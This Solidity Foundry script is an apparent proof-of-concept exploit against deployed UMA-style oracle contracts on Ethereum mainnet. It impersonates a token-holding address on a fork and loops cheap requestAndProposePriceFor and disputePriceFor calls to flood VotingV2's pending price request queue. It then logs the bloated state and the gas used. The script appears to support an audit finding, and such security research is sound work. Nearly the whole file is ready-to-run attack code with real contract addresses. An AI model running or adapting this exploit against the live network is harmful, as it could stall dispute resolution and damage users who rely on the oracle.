pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";
import {SkinnyOptimisticOracle, SkinnyOptimisticOracleInterface, IERC20} from "script/SkinnyOptimisticOracle.sol";

struct PriceRequest {
        uint32 lastVotingRound;
        bool isGovernance;
        uint64 time;
        uint32 rollCount;
        bytes32 identifier;
        mapping(uint32 => VoteInstance) voteInstances;
        bytes ancillaryData;
    }

    struct VoteInstance {
        mapping(address => VoteSubmission) voteSubmissions; 
        Data results;
    }

    struct Data {
        mapping(int256 => uint128) voteFrequency;
        uint128 totalVotes;
        int256 currentMode;
    }

    struct VoteSubmission {
        bytes32 commit;
        bytes32 revealHash;
    }

interface IVotingV2 {
    function voteTiming() external view returns (uint256 voteTiming);
    function requestUnstake(uint128 amount) external;
    function currentActiveRequests() external view returns (bool);
    function processResolvablePriceRequests() external;
    function lastRoundIdProcessed() external view returns (uint32);
    function nextPendingIndexToProcess() external view returns (uint256);
    function getCurrentRoundId() external view returns (uint32);
    function priceRequests(bytes32) external view returns (uint32 lastVotingRound, bool isGovernance, uint64 time, uint32 rollCount, bytes32 identifier, bytes memory ancillaryData);
    function pendingPriceRequestsIds(uint256) external view returns (bytes32);
    function getNumberOfPriceRequests() external view returns (uint256 numberPendingPriceRequests, uint256 numberResolvedPriceRequests);
}

interface IChubbyPessimisticOracle {
    function disputePriceFor(
        bytes32 identifier,
        uint32 timestamp,
        bytes memory ancillaryData,
        SkinnyOptimisticOracleInterface.Request memory request,
        address disputer,
        address requester
    ) external returns (uint256 totalBond);

    function requestAndProposePriceFor(
        bytes32 identifier,
        uint32 timestamp,
        bytes memory ancillaryData,
        IERC20 currency,
        uint256 reward,
        uint256 bond,
        uint256 customLiveness,
        address proposer,
        int256 proposedPrice
    ) external returns (uint256 totalBond);

    function stampAncillaryData(bytes memory ancillaryData, address requester)
        external
        view
        returns (bytes memory);
}

contract DagothUr is Script {
    uint256 public constant ITERATIONS_COUNT = 10; //number of iterations to simulate, each single simulation adds 1 entry to pendingPriceRequestsIds of VotingV2.sol

    function run() external {
        uint256 forkId = vm.createFork("https://mainnet.infura.io/v3/{PASTE_YOUR_INFURA_KEY}");
        vm.selectFork(forkId);

        address currencyAddress = 0xBD2F0Cd039E0BFcf88901C98c0bFAc5ab27566e3; //Collateral Dynamic Set Dollar ERC20 address
        address oracleAddress = 0xeE3Afe347D5C74317041E2618C49534dAf887c24; //SkinnyOptimisticOracle address 
        address votingAddress = 0x004395edb43EFca9885CEdad51EC9fAf93Bd34ac; //VotingV2.sol address
        address userAddress = 0x74497B44D67870C49a335497648Af77D9F3F41da; //EOA address holding 6 billion values of price requeset collateral (Dynamic Set Dollar), this address will initialize the attack
        address storeAddress = 0x54f44eA3D2e7aA0ac089c4d8F7C93C27844057BF; //Store.sol address

        vm.deal(userAddress, 1 ether); //deal ether for gas
        vm.startPrank(userAddress); //impersonate an initiator address
        vm.record();

        IChubbyPessimisticOracle oracle = IChubbyPessimisticOracle(oracleAddress); 
        IVotingV2 voting = IVotingV2(votingAddress);
        bytes32 identifier = bytes32("SHERLOCK_CLAIM"); //identifier present in the IdentifierWhitelist.sol white list
        bytes memory ancillaryData = abi.encode("testtest"); //any short string
        IERC20 currency = IERC20(currencyAddress); //DSD ERC20
        currency.approve(oracleAddress, type(uint256).max); //oracle should have allowance to spend DSD on behalf of userAddress
        uint256 reward = 0;
        uint256 bond = 1;
        uint256 customLiveness = 0;

        uint256 balance = currency.balanceOf(userAddress);
        console.log("User balance:", balance);
        if (balance == 0) {
            console.log("Error: User has no tokens. Exiting.");
            return;
        }

        uint256 gasBefore = gasleft();
        for (uint32 timestamp = 0; timestamp < ITERATIONS_COUNT; timestamp++) {

          
            (uint256 numberBefore, uint256 resolvedNumberBefore) = voting.getNumberOfPriceRequests();
            console.log("Pending requests length before iteration: ", numberBefore);

            vm.recordLogs();
            uint256 totalBond = oracle.requestAndProposePriceFor(
                identifier,
                timestamp,
                ancillaryData,
                currency,
                reward,
                bond,
                customLiveness,
                userAddress,
                0
            );
            console.log("Request and propose price for timestamp", timestamp, "totalBond", totalBond);

						//fetching the request data from the logs of requestAndProposePriceFor call to pass it to disputePriceFor
            Vm.Log[] memory entries = vm.getRecordedLogs();
            SkinnyOptimisticOracleInterface.Request memory request;
            bytes memory resultAncillaryData;
            bytes32 proposePriceTopic = keccak256(
                "ProposePrice(address,bytes32,uint32,bytes,(address,address,address,bool,int256,int256,uint256,uint256,uint256,uint256,uint256))"
            );

            for (uint256 i = 0; i < entries.length; i++) {
                Vm.Log memory entry = entries[i];
                if (entry.topics[0] == proposePriceTopic) {
                    (uint32 decodedTimestamp, bytes memory decodedAncillaryData, SkinnyOptimisticOracleInterface.Request memory decodedRequest) = abi.decode(
                        entry.data,
                        (uint32, bytes, SkinnyOptimisticOracleInterface.Request)
                    );
                    request = decodedRequest;
                    resultAncillaryData = decodedAncillaryData;
                    break;
                }
            }

            console.log("Request Proposer:", request.proposer);
            console.log("Request Currency:", address(request.currency));
            console.log("Decoded ancillaryData:", abi.decode(resultAncillaryData, (string)));

            // Stamp the ancillaryData for disputePriceFor
            bytes memory stampedAncillaryData = oracle.stampAncillaryData(ancillaryData, userAddress);
            console.log("Stamped ancillaryData:", abi.decode(stampedAncillaryData, (string)));

            uint256 otherTotalBond = oracle.disputePriceFor(identifier, timestamp, ancillaryData, request, userAddress, userAddress);

            console.log("Total bond after dispute: ", otherTotalBond);

            (uint256 numberAfter, uint256 resolvedNumberAfter) = voting.getNumberOfPriceRequests();
            console.log("Pending requests length after iteration: ", numberAfter);
        }
        //console.log("Last round id processed: ", voting.lastRoundIdProcessed());
        //console.log("Next pending index to process: ", voting.nextPendingIndexToProcess());
        //console.log("Current round id: ", voting.getCurrentRoundId());
        //console.log("Vote timing: ", voting.voteTiming());

//UNCOMMENT THIS BLOCK FOR DETAILED OF THE VotingV2.sol price request state
(uint256 numberPendingPriceRequests, uint256 numberResolvedPriceRequests) = voting.getNumberOfPriceRequests();
       console.log("Number of pending price requests: ", numberPendingPriceRequests);
			 
		console.log("-----\nALL PRICE REQUESTS DATA PRESENT IN VotingV2.sol:\n------\n\n");
        for (uint256 i = 0; i < numberPendingPriceRequests; i++) {
	         bytes32 pendingPriceRequest = voting.pendingPriceRequestsIds(i);
	         (uint32 lastVotingRound, bool isGovernance, uint64 time, uint32 rollCount, bytes32 otherIdentifier, bytes memory otherAncillaryData) = voting.priceRequests(pendingPriceRequest);
	         console.log("--- Price Request ---");
	         console.log("Identifier: ", bytes32ToString(otherIdentifier));
	         console.logBytes32(otherIdentifier);
	         console.log("Time:", time);
	         console.log("Last Voting Round:", lastVotingRound);
	         console.log("Is Governance:", isGovernance);
	         console.log("Roll Count:", rollCount);
	         console.log("Ancillary Data: ", string(otherAncillaryData));
	         console.logBytes(otherAncillaryData); // Use this for bytes
        }
        console.log("\n\n");

        uint256 gasAfter = gasleft();
        console.log(gasBefore - gasAfter, "GAS USED FOR ", ITERATIONS_COUNT, "ITERATIONS");
        //voting.currentActiveRequests();
        //uint256 gasAfter2 = gasleft();
        //console.log("Gas used for unstake: ", gasAfter - gasAfter2);
        vm.stopPrank();
    }

    function bytes32ToString(bytes32 _bytes32) internal pure returns (string memory) {
        uint8 i = 0;
        while (i < 32 && _bytes32[i] != 0) {
            i++;
        }
        bytes memory bytesArray = new bytes(i);
        for (uint8 j = 0; j < i; j++) {
            bytesArray[j] = _bytes32[j];
        }
        return string(bytesArray);
    }
}